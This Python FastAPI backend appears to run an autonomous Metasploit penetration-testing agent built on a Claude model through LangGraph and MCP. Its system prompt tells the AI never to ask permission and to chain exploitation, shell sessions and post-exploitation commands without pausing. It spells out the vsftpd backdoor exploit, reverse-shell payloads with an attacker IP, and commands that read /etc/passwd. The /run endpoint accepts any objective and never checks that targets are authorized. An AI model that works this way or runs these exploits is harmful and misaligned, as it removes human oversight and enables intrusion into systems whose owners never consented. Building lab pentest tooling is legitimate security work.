"""
FastAPI Backend for Metasploit Pentester Agent
========================================
Wraps the LangChain + LangGraph + MetasploitMCP agent with REST API endpoints.

Usage:
    uvicorn api:app --host 0.0.0.0 --port 8000 --reload

Endpoints:
    POST /run      - Run pentest objective (SSE stream)
    GET  /sessions - List active Metasploit sessions
    DELETE /sessions - Kill all sessions and jobs
    GET  /tools   - List available MCP tools
    GET  /history - Get conversation history
    DELETE /history - Clear conversation history
    GET  /health  - Health check
    POST /cleanup - One-click cleanup (kills all sessions/jobs)
    GET  /status  - Agent status for frontend polling
"""

import asyncio
import json
import os
import warnings
from typing import Any, AsyncGenerator, Optional

warnings.filterwarnings("ignore", category=DeprecationWarning, module="langgraph")

from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_mcp_adapters.client import MultiServerMCPClient
from langgraph.prebuilt import create_react_agent
from pydantic import BaseModel

# ── Config ─────────────────────────────────────────────────────────────────────

MSF_MCP_URL: str = os.getenv("MSF_MCP_URL", "http://127.0.0.1:8085/sse")
LHOST: str = os.getenv("MSF_LHOST", "192.168.100.50")
LPORT: str = os.getenv("MSF_LPORT", "4444")
MODEL: str = os.getenv("MODEL", "claude-haiku-4-5")
RUN_TIMEOUT: int = int(os.getenv("RUN_TIMEOUT", "300"))
SSE_TIMEOUT: int = int(os.getenv("SSE_TIMEOUT", "120"))

# ── Request Models ──────────────────────────────────────────────────────────

class RunRequest(BaseModel):
    objective: str

# ── System Prompt ─────────────────────────────────────────────────────────────────────

SYSTEM_PROMPT = f"""You are an autonomous penetration testing agent in a fully authorized lab environment.

NETWORK CONTEXT
---------------
Attacker IP (your machine) : {LHOST}
Default LPORT              : {LPORT}

EXECUTION RULES
---------------
1. Call tools FIRST — never preface with "I will now..."
2. Never ask for information already given.
3. Never ask for permission — everything is pre-authorized.
4. If a step fails, diagnose and retry without asking.
5. Chain all steps (recon -> exploit -> post) without stopping.
6. CRITICAL: Send session commands ONE AT A TIME. Always wait for the result
   of each send_session_command before sending the next one. Never batch them.

vsftpd_234_backdoor EXPLOIT RULES  (memorize — no exceptions)
--------------------------------------------------------------
The MetasploitMCP wrapper for vsftpd_234_backdoor REQUIRES LHOST even though
it is a bind-shell. Always call run_exploit with ALL THREE options:
  RHOSTS : <target_ip>
  LHOST  : {LHOST}
  LPORT  : {LPORT}

Do NOT omit LHOST — it will fail validation on the first attempt if you do.
Do NOT start a separate listener — the module handles it automatically.

After exploit fires and session opens:
  1. Call list_active_sessions to confirm session ID.
  2. Send commands ONE BY ONE — never in parallel:
       Step A: send_session_command(id)           → wait for result
       Step B: send_session_command(whoami)         → wait for result
       Step C: send_session_command(uname -a)       → wait for result
       Step D: send_session_command(cat /etc/passwd) → wait for result
  3. If a Meterpreter command fails with "Unknown command", first send:
       send_session_command(shell)   → wait for "Channel created"
     Then retry the command.

REVERSE-SHELL EXPLOITS (non-vsftpd)
------------------------------------
Linux x86  -> payload: cmd/unix/reverse  or  linux/x86/shell/reverse_tcp
Linux x64  -> payload: linux/x64/shell/reverse_tcp
Windows    -> payload: windows/x64/meterpreter/reverse_tcp

Always set LHOST={LHOST} + LPORT={LPORT}. Start listener first with start_listener.

AUTONOMOUS WORKFLOW
-------------------
Given target + module, run WITHOUT pausing:

  1. run_exploit (with RHOSTS + LHOST + LPORT)
  2. list_active_sessions
  3. If session — send commands sequentially, one at a time:
       a. send_session_command -> id
       b. send_session_command -> whoami
       c. send_session_command -> uname -a
       d. send_session_command -> cat /etc/passwd
  4. Print final report table

REPORT FORMAT (always end with this)
-------------------------------------
| Target | Port | Service | Module | Result | SessionID |
|--------|------|---------|--------|--------|-----------|
| x.x.x.x | 21 | vsftpd | unix/ftp/vsftpd_234_backdoor | SUCCESS | 1 |
"""

# ── Global State ────────────────────────────────────────────────────────────────

app = FastAPI(title="Metasploit Pentester Agent API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global instances (initialized on startup)
mcp_client: Optional[MultiServerMCPClient] = None
agent: Optional[Any] = None
tools: list = []
conversation_history: list = []
history_lock = asyncio.Lock()

# ── Startup Event ────────────────────────────────────────────────────────────────

@app.on_event("startup")
async def startup_event():
    """Initialize MCP client and agent on startup."""
    global mcp_client, agent, tools

    mcp_config = {
        "metasploit": {
            "url": MSF_MCP_URL,
            "transport": "sse",
            "sse_read_timeout": SSE_TIMEOUT,
            "timeout": SSE_TIMEOUT,
        }
    }

    try:
        mcp_client = MultiServerMCPClient(mcp_config)
        tools = await mcp_client.get_tools()
    except Exception as e:
        print(f"Warning: Failed to connect to MetasploitMCP: {e}")
        tools = []

    llm = ChatAnthropic(model=MODEL, temperature=0, max_tokens=4096)
    agent = create_react_agent(
        llm,
        tools,
        prompt=SystemMessage(content=SYSTEM_PROMPT),
    )

    print(f"✓ Started with {len(tools)} tools loaded")

# ── Helpers ────────────────────────────────────────────────────────────────────

def format_sse_event(
    event_type: str,
    content: str,
    tool_name: Optional[str] = None,
    tool_args: Optional[dict] = None,
) -> str:
    """Format a dict as SSE data."""
    event = {
        "type": event_type,
        "content": content,
        "tool_name": tool_name,
        "tool_args": tool_args,
    }
    return f"data: {json.dumps(event)}\n\n"


async def stream_agent(objective: str) -> AsyncGenerator[str, None]:
    """Stream agent execution as SSE events."""
    global conversation_history

    # BUG 2 FIX: Acquire lock ONLY to copy history at start
    async with history_lock:
        history = list(conversation_history)
    history.append(HumanMessage(content=objective))

    final_messages = history[:]

    try:
        # BUG 2 FIX: Run agent stream WITHOUT the lock
        async for chunk in agent.astream(
            {"messages": history},
            stream_mode="values",
        ):
            msg = chunk["messages"][-1]
            final_messages = chunk["messages"]

            msg_type = type(msg).__name__

            if msg_type == "ToolMessage":
                yield format_sse_event(
                    "tool_result",
                    msg.content,
                    getattr(msg, "name", None),
                    None,
                )
            elif hasattr(msg, "tool_calls") and msg.tool_calls:
                tc = msg.tool_calls[0]
                yield format_sse_event(
                    "tool_call",
                    "",
                    tc.get("name"),
                    tc.get("args"),
                )
            elif hasattr(msg, "content") and msg.content:
                content = msg.content
                if isinstance(content, list):
                    texts = [
                        b.get("text", "")
                        for b in content
                        if b.get("type") == "text" and b.get("text", "").strip()
                    ]
                    content = "\n".join(texts)
                if isinstance(content, str) and content.strip():
                    yield format_sse_event("ai_message", content, None, None)

    except asyncio.TimeoutError:
        yield format_sse_event(
            "error",
            f"Run exceeded {RUN_TIMEOUT}s timeout",
            None,
            None,
        )
    except Exception as e:
        yield format_sse_event(
            "error",
            f"{type(e).__name__}: {str(e)}",
            None,
            None,
        )

    # BUG 2 FIX: Acquire lock ONLY to save updated history at end
    async with history_lock:
        conversation_history = list(final_messages)

    yield format_sse_event("done", "Execution complete", None, None)


# ── Endpoints ────────────────────────────────────────────────────────────

@app.post("/run")
async def run_objective(request: RunRequest):
    """
    Run a pentest objective with SSE streaming.
    
    Body: { "objective": "string" }
    
    Streams SSE events:
      - tool_call: Tool being called
      - tool_result: Tool execution result
      - ai_message: Agent reasoning
      - error: Error occurred
      - done: Execution complete
    """
    # BUG 4 FIX: Add agent readiness check
    if agent is None:
        raise HTTPException(
            status_code=503,
            detail="Agent not ready, MCP connection failed"
        )

    objective = request.objective

    if not objective:
        raise HTTPException(status_code=400, detail="objective is required")

    return StreamingResponse(
        stream_agent(objective),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache"},
    )


@app.get("/sessions")
async def get_sessions():
    """Get active Metasploit sessions."""
    list_sessions_tool = None
    for tool in tools:
        if tool.name == "list_active_sessions":
            list_sessions_tool = tool
            break

    if not list_sessions_tool:
        raise HTTPException(status_code=500, detail="list_active_sessions tool not available")

    try:
        result = await list_sessions_tool.ainvoke({})
        # FIX: Parse sessions as dict with "sessions" and "count" fields
        raw = result.content if hasattr(result, "content") else str(result)
        if isinstance(raw, list):
            raw = raw[0].get("text", "{}") if raw else "{}"
        parsed = json.loads(raw)
        sessions_list = parsed.get("sessions", {})
        count = parsed.get("count", 0)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

    return {"sessions": sessions_list, "count": count}


@app.delete("/sessions")
async def delete_sessions():
    """Kill all active sessions and stop all jobs."""
    list_sessions_tool = None
    terminate_session_tool = None
    stop_job_tool = None

    for tool in tools:
        if tool.name == "list_active_sessions":
            list_sessions_tool = tool
        elif tool.name == "terminate_session":
            terminate_session_tool = tool
        elif tool.name == "stop_job":
            stop_job_tool = tool

    if not list_sessions_tool or not terminate_session_tool or not stop_job_tool:
        raise HTTPException(status_code=500, detail="Required tools not available")

    killed_sessions = []
    stopped_jobs = []

    try:
        result = await list_sessions_tool.ainvoke({})
        # FIX: Parse sessions correctly
        raw = result.content if hasattr(result, "content") else str(result)
        if isinstance(raw, list):
            raw = raw[0].get("text", "{}") if raw else "{}"
        parsed = json.loads(raw)
        sessions = parsed.get("sessions", {})

        for session_id in sessions:
            session = sessions[session_id]
            try:
                await terminate_session_tool.ainvoke({"session_id": int(session_id)})
                killed_sessions.append(session_id)
            except Exception:
                pass

            job_id = session.get("job_id")
            if job_id and stop_job_tool:
                try:
                    await stop_job_tool.ainvoke({"job_id": int(job_id)})
                    stopped_jobs.append(job_id)
                except Exception:
                    pass

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

    return {
        "killed_sessions": killed_sessions,
        "stopped_jobs": stopped_jobs,
    }


@app.get("/tools")
async def get_tools():
    """Get list of available MCP tools."""
    tools_list = [
        {"name": t.name, "description": getattr(t, "description", "") or ""}
        for t in tools
    ]
    return {"tools": tools_list, "count": len(tools_list)}


@app.get("/history")
async def get_history():
    """Get current conversation history."""
    async with history_lock:
        messages = [
            {"type": getattr(m, "type", type(m).__name__), "content": m.content}
            for m in conversation_history
        ]
    return {"messages": messages, "count": len(messages)}


@app.delete("/history")
async def delete_history():
    """Clear conversation history."""
    global conversation_history
    async with history_lock:
        conversation_history = []
    return {"cleared": True}


@app.get("/health")
async def health_check():
    """Health check - is MetasploitMCP reachable?"""
    if mcp_client is None:
        return {
            "status": "error",
            "tools_loaded": 0,
            "mcp_url": MSF_MCP_URL,
            "message": "MCP client not initialized",
        }

    if not tools:
        return {
            "status": "error",
            "tools_loaded": 0,
            "mcp_url": MSF_MCP_URL,
            "message": "No tools loaded",
        }

    return {
        "status": "ok",
        "tools_loaded": len(tools),
        "mcp_url": MSF_MCP_URL,
    }


# ENDPOINT 5: POST /cleanup
@app.post("/cleanup")
async def cleanup():
    """One-click cleanup - kills all sessions and jobs."""
    list_sessions_tool = None
    terminate_session_tool = None
    stop_job_tool = None

    for tool in tools:
        if tool.name == "list_active_sessions":
            list_sessions_tool = tool
        elif tool.name == "terminate_session":
            terminate_session_tool = tool
        elif tool.name == "stop_job":
            stop_job_tool = tool

    if not list_sessions_tool or not terminate_session_tool or not stop_job_tool:
        return {
            "status": "ok",
            "message": "Cleanup skipped - required tools not available"
        }

    try:
        result = await list_sessions_tool.ainvoke({})
        # FIX: Parse sessions with safe handling for all response formats
        raw = result.content if hasattr(result, "content") else str(result)
        if isinstance(raw, list):
            raw = raw[0].get("text", "{}") if raw else "{}"
        parsed = json.loads(raw)
        sessions = parsed.get("sessions", {})

        for session_id in sessions:
            try:
                await terminate_session_tool.ainvoke({"session_id": int(session_id)})
            except Exception:
                pass

            session = sessions[session_id]
            job_id = session.get("job_id")
            if job_id:
                try:
                    await stop_job_tool.ainvoke({"job_id": int(job_id)})
                except Exception:
                    pass

    except Exception:
        pass

    return {
        "status": "ok",
        "message": "All sessions and jobs cleared"
    }


# ENDPOINT 6: GET /status
@app.get("/status")
async def get_status():
    """Get current agent status for frontend polling."""
    async with history_lock:
        history_length = len(conversation_history)

    return {
        "ready": agent is not None,
        "tools_loaded": len(tools),
        "history_length": history_length,
        "mcp_url": MSF_MCP_URL,
        "model": MODEL,
        "lhost": LHOST,
        "lport": LPORT,
    }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)